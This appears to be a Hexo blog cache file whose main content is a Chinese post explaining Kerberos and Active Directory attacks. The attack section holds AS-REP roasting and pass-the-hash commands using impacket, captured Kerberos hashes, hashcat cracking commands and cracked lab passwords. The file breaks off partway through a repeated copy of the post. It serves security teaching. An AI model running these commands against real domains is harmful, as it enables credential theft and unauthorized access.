{"meta":{"version":1,"warehouse":"5.0.1"},"models":{"Asset":[{"_id":"themes/minimalism/source/fonts/iconfont.eot","path":"fonts/iconfont.eot","modified":0,"renderable":1},{"_id":"themes/minimalism/source/fonts/iconfont.svg","path":"fonts/iconfont.svg","modified":0,"renderable":1},{"_id":"themes/minimalism/source/fonts/iconfont.ttf","path":"fonts/iconfont.ttf","modified":0,"renderable":1},{"_id":"themes/minimalism/source/fonts/iconfont.woff","path":"fonts/iconfont.woff","modified":0,"renderable":1},{"_id":"themes/minimalism/source/fonts/iconfont.woff2","path":"fonts/iconfont.woff2","modified":0,"renderable":1},{"_id":"themes/minimalism/source/images/avatar.png","path":"images/avatar.png","modified":0,"renderable":1},{"_id":"themes/minimalism/source/images/icp.png","path":"images/icp.png","modified":0,"renderable":1},{"_id":"themes/minimalism/source/images/loading.svg","path":"images/loading.svg","modified":0,"renderable":1},{"_id":"themes/minimalism/source/js/gitalk.min.js","path":"js/gitalk.min.js","modified":0,"renderable":1},{"_id":"themes/minimalism/source/js/jquery.fancybox.min.js","path":"js/jquery.fancybox.min.js","modified":0,"renderable":1},{"_id":"themes/minimalism/source/js/jquery.min.js","path":"js/jquery.min.js","modified":0,"renderable":1},{"_id":"themes/minimalism/source/js/main.js","path":"js/main.js","modified":0,"renderable":1},{"_id":"themes/minimalism/source/js/simple-lightbox.min.js","path":"js/simple-lightbox.min.js","modified":0,"renderable":1},{"_id":"themes/minimalism/source/js/twikoo.min.js","path":"js/twikoo.min.js","modified":0,"renderable":1},{"_id":"themes/minimalism/source/style/animate.min.css","path":"style/animate.min.css","modified":0,"renderable":1},{"_id":"themes/minimalism/source/style/gitalk.min.css","path":"style/gitalk.min.css","modified":0,"renderable":1},{"_id":"themes/minimalism/source/style/jquery.fancybox.min.css","path":"style/jquery.fancybox.min.css","modified":0,"renderable":1},{"_id":"themes/minimalism/source/style/main.styl","path":"style/main.styl","modified":0,"renderable":1},{"_id":"themes/minimalism/source/style/prism.css","path":"style/prism.css","modified":0,"renderable":1},{"_id":"themes/minimalism/source/style/simple-lightbox.min.css","path":"style/simple-lightbox.min.css","modified":0,"renderable":1}],"Cache":[{"_id":"source/_posts/Kerberos协议简单讲解.md","hash":"6948f67fc684cdca38ea7572c372d16dab1eae20","modified":1732159169023},{"_id":"source/_posts/javaAgent利用.md","hash":"973c81fde80578b07c1a887ada2f7e21c101361f","modified":1732903041446},{"_id":"source/about/index.md","hash":"fadeb2e38ca2c433fcee243605ac0bae57dfe4d3","modified":1732095237172},{"_id":"source/contact/index.md","hash":"7d69cfd75da96e8b5232d78919e159bd12bdfc51","modified":1732094802987},{"_id":"source/tags/index.md","hash":"f99526a64f6a8e11c957181bef38741843b61fbe","modified":1732094727481},{"_id":"themes/minimalism/.editorconfig","hash":"2fea5b9eb9b9109319ca18a68aea8bc7e8bb1b21","modified":1732094061210},{"_id":"themes/minimalism/.eslintignore","hash":"15b2178cc6b82b652f0a9a7abe2a929ae8d0b628","modified":1732094061210},{"_id":"themes/minimalism/.eslintrc.json","hash":"b74977d8797b557b529f1f07fba3e38fa66491b3","modified":1732094061210},{"_id":"themes/minimalism/.gitignore","hash":"3ef9f001c4f5ceabde01886f0af36a4e9c8906a4","modified":1732094061210},{"_id":"themes/minimalism/LICENSE","hash":"0c1482cb3363b34f85bfc52eb81af86de8e36ea4","modified":1732094061210},{"_id":"themes/minimalism/README.md","hash":"92b30d6e0726a0b01f558b4d420534a8fd255626","modified":1732094061211},{"_id":"themes/minimalism/README_EN.md","hash":"c999589a3a703cd7953a03f579cd83009f1d3c79","modified":1732094061211},{"_id":"themes/minimalism/TODO.md","hash":"4ddf50a6f2ce0b5ed1c25ab92676ab07b9ee2e58","modified":1732094061211},{"_id":"themes/minimalism/_config.yml","hash":"70b44a3702ad7d74b6390ccaa23d646196191578","modified":1732167461868},{"_id":"themes/minimalism/package.json","hash":"1e187d513058e3cb12caf656a39a4d4844b074b0","modified":1732094061211},{"_id":"themes/minimalism/layout/archive.ejs","hash":"937a63d7bf5fff3309ddfe21b0383723d00e7581","modified":1732094061211},{"_id":"themes/minimalism/layout/categories.ejs","hash":"5da40342406cbb9ae8bec860976d826c31dfa559","modified":1732094061211},{"_id":"themes/minimalism/layout/index.ejs","hash":"6d5282a7bed31e0505000accca6f94f36c8e03db","modified":1732094061211},{"_id":"themes/minimalism/layout/post.ejs","hash":"3e036f08facc3397052d77d802297d18a8db6c78","modified":1732094061211},{"_id":"themes/minimalism/layout/tag.ejs","hash":"77d01f8f35cc4cec69922115fd707c102f8a39f3","modified":1732094061211},{"_id":"themes/minimalism/layout/tags.ejs","hash":"40294b7529e551d85545073718be689902341e9e","modified":1732094061211},{"_id":"themes/minimalism/.github/ISSUE_TEMPLATE/bug-report--english-version-.md","hash":"c3864a3f55a9896c4a7b141b8503cd1d65e1c1e1","modified":1732094061210},{"_id":"themes/minimalism/.github/ISSUE_TEMPLATE/bug-提交--中文版本-.md","hash":"5519006a5903cb2a40dd1d497f38838f81ac9e6e","modified":1732094061210},{"_id":"themes/minimalism/.github/ISSUE_TEMPLATE/feature-request--english-version-.md","hash":"3f8b06768308c7a1e17e6e4fc16f368c68f9dd41","modified":1732094061210},{"_id":"themes/minimalism/.github/ISSUE_TEMPLATE/功能建议--中文版本-.md","hash":"268d6195e13b4474652b20b434f4a4b8e4c24830","modified":1732094061210},{"_id":"themes/minimalism/.github/workflows/lint.yml","hash":"68df8c35be6dc2441f589e03f9f97e3a17bd0fd0","modified":1732094061210},{"_id":"themes/minimalism/.github/workflows/npm-publish.yml","hash":"5107201940bde596d4a1dc2071b217cf6247c56a","modified":1732094061210},{"_id":"themes/minimalism/.github/workflows/test.yml","hash":"b87f489755144830738b0ac93e4791a5d13d6252","modified":1732094061210},{"_id":"themes/minimalism/layout/includes/comment.ejs","hash":"c161cb9bfd7e46387f45a13bfe0b03b56372a213","modified":1732094061211},{"_id":"themes/minimalism/layout/includes/footer.ejs","hash":"f55ef3f8900329bbbee9a96e724e3b153cd6eb6c","modified":1732094061211},{"_id":"themes/minimalism/layout/includes/head.ejs","hash":"12d347f778fda2e7e7fffbb66e0e2e79bdfb6ac8","modified":1732094061211},{"_id":"themes/minimalism/layout/includes/header.ejs","hash":"10005ab9c93bd5d24b815e2272dc803d1ded0eb3","modified":1732094061211},{"_id":"themes/minimalism/layout/includes/navigation_bar.ejs","hash":"c9b21fa44b5ebd88279051be9b7a34c49554ad68","modified":1732094061211},{"_id":"themes/minimalism/layout/includes/post-list-archives.ejs","hash":"bb09bb888587d8e43b8d5b022991bdaa9beeb551","modified":1732094061211},{"_id":"themes/minimalism/layout/includes/post-list-category.ejs","hash":"bd60f81c39dd98610659290e9c9fcaa7d4fb45ab","modified":1732094061211},{"_id":"themes/minimalism/layout/includes/post-list.ejs","hash":"dd5b5b0b83f17b982d6b204acf78535ed462fcbc","modified":1732094061211},{"_id":"themes/minimalism/layout/includes/scripts.ejs","hash":"898b7f5665ec5d2c8d4c0f9ccd4e18efd984af6d","modified":1732094061211},{"_id":"themes/minimalism/scripts/events/config.js","hash":"9d927f696fd334caac2a5a7a4b9887d7b933c43a","modified":1732094061211},{"_id":"themes/minimalism/scripts/filters/footnotes.js","hash":"2d9267a36cda1a046c55a2953ad8993e8167e5a7","modified":1732094061212},{"_id":"themes/minimalism/scripts/filters/img-handle.js","hash":"0eb52945a24f8d7000d4dd8233882fde02fbe858","modified":1732094061212},{"_id":"themes/minimalism/scripts/filters/post-hide.js","hash":"4a1f326e783bc61fd0cb3892e6a50ad4721f4cf2","modified":1732094061212},{"_id":"themes/minimalism/scripts/helper/export-config.js","hash":"0fb860cbd57a636e673d17f84815ac10cbd5204d","modified":1732094061212},{"_id":"themes/minimalism/scripts/helper/start-path.js","hash":"9a12466662fb6a905f95e6d683de8845195da827","modified":1732094061212},{"_id":"themes/minimalism/source/fonts/iconfont.eot","hash":"6ccf986ee38a9f2e8b549e0a7c0f0720a2ad96ae","modified":1732094061212},{"_id":"themes/minimalism/source/fonts/iconfont.svg","hash":"164e3df3ee1184ca7b228fc33f67636f4a5d1d44","modified":1732094061212},{"_id":"themes/minimalism/source/fonts/iconfont.ttf","hash":"20ca590d74c100b3ac94732d5302b563c2f6c4a2","modified":1732094061212},{"_id":"themes/minimalism/source/fonts/iconfont.woff","hash":"a045a6f231cf0bf883de29ddf80d7afff942e430","modified":1732094061212},{"_id":"themes/minimalism/source/images/loading.svg","hash":"364550d66fb15b740c038da4780ff4c78c500c70","modified":1732094061212},{"_id":"themes/minimalism/source/js/main.js","hash":"35e63a8f05c5442816cc48151ec59fd00c7053f6","modified":1732094061219},{"_id":"themes/minimalism/source/js/simple-lightbox.min.js","hash":"b50f76fcad84ecf33a9aa34f00355172f567107b","modified":1732094061219},{"_id":"themes/minimalism/source/style/gitalk.min.css","hash":"6962fa23f67397d776cfd7729e037ff7542c5e96","modified":1732094061222},{"_id":"themes/minimalism/source/style/jquery.fancybox.min.css","hash":"1be9b79be02a1cfc5d96c4a5e0feb8f472babd95","modified":1732094061222},{"_id":"themes/minimalism/source/style/main.styl","hash":"285cc6c090d34553f3b69d74970716f4833108a8","modified":1732094061222},{"_id":"themes/minimalism/source/style/prism.css","hash":"dd7725fa2667134d243e423b9b7fb2b8a6d650e0","modified":1732094061222},{"_id":"themes/minimalism/source/style/simple-lightbox.min.css","hash":"f56f6e1580a36087fc56dd078ba965b0f16adf31","modified":1732094061222},{"_id":"themes/minimalism/source/style/_blocks/archives.styl","hash":"bc88e92d5faa16d43d391ad55d556d93c5022f9f","modified":1732094061221},{"_id":"themes/minimalism/source/style/_blocks/figure.styl","hash":"42a0bb609aa7884f793f1f1319ea38fe9b92fa97","modified":1732094061221},{"_id":"themes/minimalism/source/style/_blocks/fonts.styl","hash":"5c43958e4fbb1432c23ea8689f4d8119eb95ed59","modified":1732094061221},{"_id":"themes/minimalism/source/style/_blocks/footer.styl","hash":"d96076e27a9600c27680942dbc2d672c280778d3","modified":1732094061221},{"_id":"themes/minimalism/source/style/_blocks/header.styl","hash":"ecb3c838e38d400e20dd352ff5f2c7a99ca289ca","modified":1732094061221},{"_id":"themes/minimalism/source/style/_blocks/link.styl","hash":"d6cc5589164ed3a86350fc2dbd21a9a7f0758888","modified":1732094061221},{"_id":"themes/minimalism/source/style/_blocks/list.styl","hash":"88e7a9b8c03f28a5fc9981893f39eaccba849edf","modified":1732094061221},{"_id":"themes/minimalism/source/style/_blocks/pagination.styl","hash":"2951319ce0f252df42456f3070b98ffe1a584e6c","modified":1732094061221},{"_id":"themes/minimalism/source/style/_blocks/post.styl","hash":"6e1b811117d5a1e6559102a7504bf9beb9cba6a4","modified":1732094061221},{"_id":"themes/minimalism/source/style/_blocks/tag.styl","hash":"0d005ef7c23e6916882321401dd510d154c6a184","modified":1732094061222},{"_id":"themes/minimalism/source/style/_blocks/tags.styl","hash":"556aa2072bd8142821f8ee63c105d49bbe029888","modified":1732094061222},{"_id":"themes/minimalism/source/style/_core/base.styl","hash":"792686d482e8131984f9565c14c2e0543b2b652f","modified":1732094061222},{"_id":"themes/minimalism/source/style/_core/colors.styl","hash":"ae0fcec7f2f19b56915e3ffd2ae9ce62a002fc5b","modified":1732094061222},{"_id":"themes/minimalism/source/style/_core/footnotes.styl","hash":"95a4f2a474660217f11b1693740b18b82cc45f03","modified":1732094061222},{"_id":"themes/minimalism/source/style/_core/hljs.styl","hash":"e201e1b47b99a78d91aad62d442e4c83dbf6069e","modified":1732094061222},{"_id":"themes/minimalism/source/style/_core/night-node.styl","hash":"626777c88f49fca319f48c4648a3cc97a04d3c7a","modified":1732094061222},{"_id":"themes/minimalism/source/images/icp.png","hash":"27a96f31f7d0413c6ade6f40e06f021f501151c7","modified":1732094061212},{"_id":"themes/minimalism/source/images/avatar.png","hash":"64c08e2325482e71fcc030351e36610c1d53ff0d","modified":1732094061212},{"_id":"themes/minimalism/source/fonts/iconfont.woff2","hash":"c44056294b4675583396c149f9745f3b62f58772","modified":1732094061212},{"_id":"themes/minimalism/source/js/jquery.fancybox.min.js","hash":"2bdabe920a06f15478524b68a9223effd7f37bdd","modified":1732094061218},{"_id":"themes/minimalism/source/js/jquery.min.js","hash":"5c5fc7a069b586d97e5ec53049ddfa5a4ef90b36","modified":1732094061218},{"_id":"themes/minimalism/source/style/animate.min.css","hash":"162ccb22979eed077317c028e313079afb872551","modified":1732094061222},{"_id":"themes/minimalism/source/js/twikoo.min.js","hash":"09aad8bf31a2a4973f7138af6b17d5f9c1859365","modified":1732094061221},{"_id":"themes/minimalism/source/js/gitalk.min.js","hash":"587aec2032011c1ccbf5033a05971a1c19678f49","modified":1732094061217},{"_id":"source/_posts/chain17.md","hash":"370c806bbcbed900969d88ee6247aa5c063e09f0","modified":1736093616311},{"_id":"source/_posts/codeql练习-micro_service_seclab.md","hash":"28da5618a1dfc7aba0e10317fdef089b19094fc5","modified":1733164212513},{"_id":"source/_posts/codeql基础语法学习.md","hash":"6f2800f38b0a88b07a3109bd301c3b16e5b93d2e","modified":1732791701039},{"_id":"source/_posts/javaAgent.md","hash":"64567c71a59e8f9ff402384d7f157e88b3f28ad9","modified":1736093463694}],"Category":[],"Data":[],"Page":[{"title":"about","date":"2024-11-20T09:23:30.000Z","_content":"\nemail : 3194164801@qq.com\n\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2024-11-20 17:23:30\n---\n\nemail : 3194164801@qq.com\n\n","updated":"2024-11-20T09:33:57.172Z","path":"about/index.html","comments":1,"layout":"page","_id":"cm3qw7j6y0000gb9p3nikgnk0","content":"<p>email : <a href=\"mailto:&#x33;&#x31;&#57;&#x34;&#x31;&#x36;&#52;&#x38;&#x30;&#49;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#109;\">&#x33;&#x31;&#57;&#x34;&#x31;&#x36;&#52;&#x38;&#x30;&#49;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#109;</a></p>\n","excerpt":"","more":"<p>email : <a href=\"mailto:&#x33;&#x31;&#57;&#x34;&#x31;&#x36;&#52;&#x38;&#x30;&#49;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#109;\">&#x33;&#x31;&#57;&#x34;&#x31;&#x36;&#52;&#x38;&#x30;&#49;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#109;</a></p>\n"},{"title":"contact","date":"2024-11-20T09:26:23.000Z","type":"contact","layout":"contact","_content":"","source":"contact/index.md","raw":"---\ntitle: contact\ndate: 2024-11-20 17:26:23\ntype: \"contact\"\nlayout: \"contact\"\n---\n","updated":"2024-11-20T09:26:42.987Z","path":"contact/index.html","comments":1,"_id":"cm3qw7j750002gb9pefn6ekwe","content":"","excerpt":"","more":""},{"title":"tags","date":"2024-11-20T09:25:06.000Z","type":"tags","layout":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2024-11-20 17:25:06\ntype: \"tags\"\nlayout: \"tags\"\n---\n","updated":"2024-11-20T09:25:27.481Z","path":"tags/index.html","comments":1,"_id":"cm3qw7j7q0005gb9p1rl52rea","content":"","excerpt":"","more":""}],"Post":[{"title":"浅谈Kerberos协议及一些攻击方法","data":"2024-11-20T16:00:00.000Z","_content":"\n# 专业词汇前瞻\n\nkerberos协议中也存在三个角色， Client   Server  KDC\n\n```\nClient:访问服务的客户机\nServer:提供服务的服务器\n\nKDC(Key Distribution Center):密钥分发中心 \nKDC中分成两个部分:Authentication Service和Ticket Granting Service\n(1)Authentication Service(AS):身份验证服务器\nAS的作用就是验证Client端的身份，验证通过之后，AS就会给TGT票据(Ticket Granting Ticket)给Client\n(2)Ticket Granting Service(TGS):票据授予服务器\nTGS的作用是通过AS发送给Client的TGT换取访问Server端的ST(Server Ticket)给Client.\n\n凭据\n(1)Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息.\n(2)Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT.\n(3)SEerver Ticket(ST):ST服务票据，由TGS服务发布.\n\nActive Directory(AD):活动目录，充当集中存储库并存储与Active Directory 用户、计算机、服务器和组织内的其他资源等对象相关的所有数据\n\nDomain Controller(DC):域控制器\n```\n\n\n\n![image-20241121000559500](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121000559500.png)\n\n\n\n# 现实场景类比\n\n这样的话其实有一个问题就是，无发现验证买票者是否合法，凭什么卖票给它。\n\n![image-20241121002134458](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002134458.png)\n\n把安检和卖票这两个功能分开即可。\n\n![image-20241121002151680](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002151680.png)\n\n## 1.身份检查\n\n![image-20241121003034910](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003034910.png)\n\n## 2.买票\n\n![image-20241121003134967](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003134967.png)\n\n## 3.入园\n\n![image-20241121003159449](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003159449.png)\n\n## 现实场景\n\n![image-20241121003409168](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003409168.png)\n\n\n\n# 过程细节\n\n## AS_REQ&AS_REP\n\n依然是clinet拿信息（Name、IP、Time等） 去AS进行认证，认证成功则获取 TGT返回给clinet。\n\n第一，KDC是存有用户hash的。\n\n第二，TGT由两部分构成，一部分用hash加密，一部分用krbtgt的hash加密。\n\n第三，注意上半部分的CT_SK\n\n![image-20241121004244873](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121004244873.png)\n\n## TGS_REQ\n\nTGS然后用户对TGT进行一些处理。底部加上我们要访问的目标servername（想要参观的动物），上半部分内容重新用CT_SK加密。\n\n![image-20241121005119609](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005119609.png)\n\n## TGS_REP\n\n1. TSG对用户发回来的TGT下半部分进行解密\n2. 然后用里面的CS_SK对上半部分进行解密\n3. 检测用户信息是都一致，是否遭到恶意篡改\n4. 将ST返回给用户\n\n![image-20241121005555888](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005555888.png)\n\n## AP_REQ&AP_REP\n\n最后一步拿着ST去参观即可。\n\n用户始终无法读取下半部分的内容，一但发现与上半部分不一样，定是上半部分的内容遭遇了篡改伪造。\n\n![image-20241121010329215](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121010329215.png)\n\n其实例子比较抽象，为了更加方便大家理解同时也丧失了一定的严谨性，其实最主要的还是尝试接受这些知识，然后对这个流程有一个大致的了解即可。\n\n# 攻击\n\n其实这些攻击说需要的信息怎么收集，这些攻击怎么实现，用什么工具。这里不深入探讨，主要还比靠大家在实践中积累。\n\n## AS_REQ\n\n其实好多攻击都生在这个阶段。\n\n### 域内用户枚举\n\n### 密码喷洒\n\n### AS-REP Roasting\n\n在as-req阶段，请求包cname对应的值是用户名，当用户状态不同时，比如用户存在且启用、用户存在但禁用、用户不存在，不同的状态返回包的提示都是不同的，因此可以进行枚举。\n\n案例\n\n```shell\nimpacket-GetNPUsers -dc-ip 172.22.15.13  xiaorang.lab/ -usersfile user.txt  # 枚举域内用户\n$krb5asrep$23$lixiuying@XIAORANG.LAB:9bccb028399d418e7868c57be60afcaf$8ea13235b6f1c2c7b6a7a20d4dc635e1e24805b2bcb9c391b8574977ac751a4ccb3cc4efd1ed47126ee95f1ed0879c103e60fc4dca57e269ba37bfe796a6286ca391061b666010ca69f4ac45b664cab6a7a17b7da508e7bfb0e04c69fa63a4481379ae03abea511486a189b80c1502a9acf310033ba1c901137eb8152431c5ac413d271a269ab6a719207403657e85a98c11375f81801e43517bb0d619d939c9f8f706c6689adb653d3925acae94864d746e30ec9d581a2d2243e9453044b59d8ec7ab349c23193d90b0dbbe3eac1a1215a1e24fa26d1289a34003b44b95976a9b2f4aa1ea49cda5cdcd8e41\n$krb5asrep$23$huachunmei@XIAORANG.LAB:879b2674cec6a159d3a5f96202160634$c88520dd6e951b91e04929aa636d965d0931f035a5a46245c8dd1a02ceeaa633dbd96718dfb1622f7ae6a40bafe2e51f43131b05082f3853dbb1b15aa302affac5e952d298ac0174e5ae6bcb5c00cd0f7dbddcb2bb6ce8730c134daf6251fbe5338b6d2a31580051b60dd71e1b8d5cf80546c4a7c44a79a24511bc7f77a09a3aebe05330f4b23e150f09884ae525fff367c956990c70545a45e3f987812eafb2e95b8769618dc1d8b8db20a4c1b374348d36a6093735673214b711025bd6fa1fe5b1ed97caf45e49b7fa17c606afca249b2180a55809ae4a57f1fcdabc8b96381c0ad6b580ef8218a2e2aa0c\n\nhashcat -a 0 -m 18200 --force '……' rockyou.txt # 利用hashcat 进行爆破\nlixiuying@xiaorang.lab:winniethepooh\nhuachunmei@xiaorang.lab:1qaz2wsx\n```\n\n### PTH(pass-the-hash)哈希传递\n\n这个阶段我们使用的是用户hash解密可以通过hash伪造用户身份发起请求，这也是哈希传递攻击出现的根本原因\n\n案例\n\n```\nimpacket-psexec administrator@172.22.15.24 -hashes ':0e52d03e9b939997401466a0ec5a9cbc' -codec gbk\n```\n\n# 黄金票据\n\n大概在AS_REQ的时候，我们注意这个TGT，我们一旦知道了krbtgt的hash。其它的一切，都是可以伪造的。伪造的CT_SK只要和上面加密使用的CT_SK保持一致就行。 \n\n而实际场景中我们需要知道这些信息。我们可以伪造任何已经存在并且知道其用户名 的用户。\n\n```\n1.域名称\n2.域的SID值\n3.域的KRBTGT账户NTLM密码哈希\n4.伪造用户名\n```\n\n![image-20241121101838006](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121101838006.png)\n\n# 白银票据\n\n这个伪造大概 发生在 AP_REQ ，这里伪造的是 ST。 \n\n可以看出来只可以访问指定server。不如黄金票据可以访问任意server。\n\n![image-20241121103017103](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121103017103.png)\n\n实际情况下需要如下信息。\n\n```\n1.域名\n2.域sid\n3.目标服务FQDN\n4.服务名\n5.服务账号的NTML HASH\n6.伪造的用户名\n```\n\n# 委派攻击\n\n想象一个场景，弟弟需要借钱，经过张妈同意后成功向张三借到钱。但是有一天。弟弟需要借一个笔，但是张三没有笔，但是他的一个艺术生同学有，张三先向他同学借，然后把这个笔给了弟弟。\n\n总的来说，就是\n\n用户A(hostA)、服务B(hostB)、服务C(hostC)，这时用户A想要使用hostB上的服务B，这个功能需要让主机hostB上的服务B访问主机HostC上的服务C中专属于用户A的部分才能完成，因此需要主机hostB上的服务B就需要代表用户A去访问hostC上的服务C，这个过程就被称为委派。\n\n![image-20241121104347394](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121104347394.png)\n\n![image-20241121105307086](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121105307086.png)\n\n这个说实话稍微复杂一些，可以单开一篇文章讲一讲了。\n\n大概可以分为\n\n## 非约束性委派\n\n## 约束性委派\n\n## 基于资源的非约束性委派(RBDC)\n\n这里挖个坑，一个是这个委派，到时候还会详解， 一个是这个Kerberos 到时候还会结合wireshark 流量分析进行详解。\n\n但是其实我感觉原理并不是最难的，而是那些眼花缭乱的工具。还有工具的使用。感觉这些原理不懂有时候也不影响大家对于工具的使用。但是懂一些原理肯定帮你多一个纬度去记忆和理解那些操作。\n\n\n\nhttps://www.bilibili.com/video/BV1DH4y1F7mf\n\nhttps://fushuling.com/index.php/2023/09/02/windows%e5%9f%9f%e6%b8%97%e9%80%8f%e4%b9%8bkerberos%e5%8d%8f%e8%ae%ae/\n","source":"_posts/Kerberos协议简单讲解.md","raw":"---\ntags:\n  - 渗透\ntitle: 浅谈Kerberos协议及一些攻击方法\ndata: 2024-11-21\n---\n\n# 专业词汇前瞻\n\nkerberos协议中也存在三个角色， Client   Server  KDC\n\n```\nClient:访问服务的客户机\nServer:提供服务的服务器\n\nKDC(Key Distribution Center):密钥分发中心 \nKDC中分成两个部分:Authentication Service和Ticket Granting Service\n(1)Authentication Service(AS):身份验证服务器\nAS的作用就是验证Client端的身份，验证通过之后，AS就会给TGT票据(Ticket Granting Ticket)给Client\n(2)Ticket Granting Service(TGS):票据授予服务器\nTGS的作用是通过AS发送给Client的TGT换取访问Server端的ST(Server Ticket)给Client.\n\n凭据\n(1)Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息.\n(2)Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT.\n(3)SEerver Ticket(ST):ST服务票据，由TGS服务发布.\n\nActive Directory(AD):活动目录，充当集中存储库并存储与Active Directory 用户、计算机、服务器和组织内的其他资源等对象相关的所有数据\n\nDomain Controller(DC):域控制器\n```\n\n\n\n![image-20241121000559500](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121000559500.png)\n\n\n\n# 现实场景类比\n\n这样的话其实有一个问题就是，无发现验证买票者是否合法，凭什么卖票给它。\n\n![image-20241121002134458](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002134458.png)\n\n把安检和卖票这两个功能分开即可。\n\n![image-20241121002151680](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002151680.png)\n\n## 1.身份检查\n\n![image-20241121003034910](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003034910.png)\n\n## 2.买票\n\n![image-20241121003134967](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003134967.png)\n\n## 3.入园\n\n![image-20241121003159449](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003159449.png)\n\n## 现实场景\n\n![image-20241121003409168](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003409168.png)\n\n\n\n# 过程细节\n\n## AS_REQ&AS_REP\n\n依然是clinet拿信息（Name、IP、Time等） 去AS进行认证，认证成功则获取 TGT返回给clinet。\n\n第一，KDC是存有用户hash的。\n\n第二，TGT由两部分构成，一部分用hash加密，一部分用krbtgt的hash加密。\n\n第三，注意上半部分的CT_SK\n\n![image-20241121004244873](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121004244873.png)\n\n## TGS_REQ\n\nTGS然后用户对TGT进行一些处理。底部加上我们要访问的目标servername（想要参观的动物），上半部分内容重新用CT_SK加密。\n\n![image-20241121005119609](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005119609.png)\n\n## TGS_REP\n\n1. TSG对用户发回来的TGT下半部分进行解密\n2. 然后用里面的CS_SK对上半部分进行解密\n3. 检测用户信息是都一致，是否遭到恶意篡改\n4. 将ST返回给用户\n\n![image-20241121005555888](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005555888.png)\n\n## AP_REQ&AP_REP\n\n最后一步拿着ST去参观即可。\n\n用户始终无法读取下半部分的内容，一但发现与上半部分不一样，定是上半部分的内容遭遇了篡改伪造。\n\n![image-20241121010329215](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121010329215.png)\n\n其实例子比较抽象，为了更加方便大家理解同时也丧失了一定的严谨性，其实最主要的还是尝试接受这些知识，然后对这个流程有一个大致的了解即可。\n\n# 攻击\n\n其实这些攻击说需要的信息怎么收集，这些攻击怎么实现，用什么工具。这里不深入探讨，主要还比靠大家在实践中积累。\n\n## AS_REQ\n\n其实好多攻击都生在这个阶段。\n\n### 域内用户枚举\n\n### 密码喷洒\n\n### AS-REP Roasting\n\n在as-req阶段，请求包cname对应的值是用户名，当用户状态不同时，比如用户存在且启用、用户存在但禁用、用户不存在，不同的状态返回包的提示都是不同的，因此可以进行枚举。\n\n案例\n\n```shell\nimpacket-GetNPUsers -dc-ip 172.22.15.13  xiaorang.lab/ -usersfile user.txt  # 枚举域内用户\n$krb5asrep$23$lixiuying@XIAORANG.LAB:9bccb028399d418e7868c57be60afcaf$8ea13235b6f1c2c7b6a7a20d4dc635e1e24805b2bcb9c391b8574977ac751a4ccb3cc4efd1ed47126ee95f1ed0879c103e60fc4dca57e269ba37bfe796a6286ca391061b666010ca69f4ac45b664cab6a7a17b7da508e7bfb0e04c69fa63a4481379ae03abea511486a189b80c1502a9acf310033ba1c901137eb8152431c5ac413d271a269ab6a719207403657e85a98c11375f81801e43517bb0d619d939c9f8f706c6689adb653d3925acae94864d746e30ec9d581a2d2243e9453044b59d8ec7ab349c23193d90b0dbbe3eac1a1215a1e24fa26d1289a34003b44b95976a9b2f4aa1ea49cda5cdcd8e41\n$krb5asrep$23$huachunmei@XIAORANG.LAB:879b2674cec6a159d3a5f96202160634$c88520dd6e951b91e04929aa636d965d0931f035a5a46245c8dd1a02ceeaa633dbd96718dfb1622f7ae6a40bafe2e51f43131b05082f3853dbb1b15aa302affac5e952d298ac0174e5ae6bcb5c00cd0f7dbddcb2bb6ce8730c134daf6251fbe5338b6d2a31580051b60dd71e1b8d5cf80546c4a7c44a79a24511bc7f77a09a3aebe05330f4b23e150f09884ae525fff367c956990c70545a45e3f987812eafb2e95b8769618dc1d8b8db20a4c1b374348d36a6093735673214b711025bd6fa1fe5b1ed97caf45e49b7fa17c606afca249b2180a55809ae4a57f1fcdabc8b96381c0ad6b580ef8218a2e2aa0c\n\nhashcat -a 0 -m 18200 